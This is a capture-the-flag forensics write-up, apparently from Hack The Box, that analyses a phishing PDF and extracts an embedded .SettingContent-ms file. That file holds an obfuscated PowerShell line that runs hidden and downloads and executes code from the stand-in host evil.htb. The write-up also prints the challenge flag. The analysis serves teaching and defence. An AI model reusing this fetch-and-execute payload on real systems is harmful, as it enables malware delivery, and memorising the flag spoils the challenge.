# PhishinImpossible

### Description:
* The team at the IMF SOC caught a wave of malicious emails coming in trying to phish our leadership. It seems like they are trying tricks in PDFs straight out of 2018. It seems like most of the users have updated PDF readers, so the document didn't execute. We're cleaning up the computers of people who did open the doc. All that's left is to dig into the attachment and find what it was trying to do. Take a look, and see if you can find the flag.

### Objective:
* Find flag in malicious Powershell inside PDF document.

### Difficulty:
* Easy

### Flag:
* `HTB{th1s_m3sS@gE_w1ll_s3lf_d3StRuC7}`

### Release:
* [forensics_phishinimpossible.zip](release/forensics_phishinimpossible.zip)

### Challenge:

Opening the document in most modern PDF readers just returns the message:

> This PDF document embeds file topsecret.SettingContent-ms

I'll make use of several tools from the [Didier Stevens Suite]() for this analysis. Running `pdfid` shows a couple suspicious things: 

```
$ pdfid PhishinImpossible.pdf 
PDFiD 0.2.7 PhishinImpossible.pdf
 PDF Header: %PDF-1.1
 obj                    9
 endobj                 9
 stream                 2
 endstream              2
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    1
 /JavaScript            1
 /AA                    0
 /OpenAction            1
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          1
 /XFA                   0                                                                                                                                                                                                                  
 /Colors > 2^24         0   
```

There's an `/OpenAction`, which will try to make something happen just on opening the document. This is commonly used in Phishing attacks.

There's also the `/EmbeddedFile`, which is likely what was referenced by Reader on opening the file.

`pdf-parser` will show the details about the object containing the `/EmbeddedFile`:

```
$ pdf-parser -t /EmbeddedFile PhishinImpossible.pdf 
This program has not been tested with this version of Python (3.9.1)
Should you encounter problems, please use Python version 3.8.7
obj 8 0
 Type: /EmbeddedFile
 Referencing: 
 Contains stream

  <<
    /Length 565
    /Filter /FlateDecode
    /Type /EmbeddedFile
  >>
```

I'll dump that object to a file with `-d`. I'll also need `-f` to manage the `/Filter /FlateDecode` to decompress the stream:

```
$ pdf-parser -t /EmbeddedFile PhishinImpossible.pdf -d embedded_file -f
...[snip]...
```

This outputs the file, which is a `.SettingContent-ms` file:

```
$ cat embedded_file 
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
  <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
      <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
      <DeepLink>%windir%\system32\cmd.exe /c pow^ers^He^l^l.exe -nO^p -w hid^den -c $I=new-object net.webclient;$flag="HTB{th1s_m3";$I.proxy=[Net.Webrequest]::GetSystemWebProxy();$flag=$flag+"sS@gE_w1ll_s3lf";$I.Proxy.Credentials=[Net.CredentialsCache]::DefaultCredentials;$flag=$flag+"_d3StRuC7}";IEX $.downloadstring('http://evil.htb/home');</DeepLink>
      <Icon>%windir%\system32\control.exe</Icon>
    </ApplicationInformation>
    <SettingIdentity>
      <PageID></PageID>
      <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
    </SettingIdentity>
    <SettingInformation>
      <Description>@shell32.dll,-4161</Description>
      <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
  </SearchableContent>
</PCSettings>
```

The `<DeepLink>` tag marks the code that will run. There's some minor obfuscation, but basically simple PowerShell that contains a `$flag` variable that's built over three parts.

### References:

- https://www.trendmicro.com/en_us/research/18/j/settingcontent-ms-can-be-abused-to-drop-complex-deeplink-and-icon-based-payload.html
- https://twitter.com/infosecn1nja/status/1021399595899731968
- https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d391
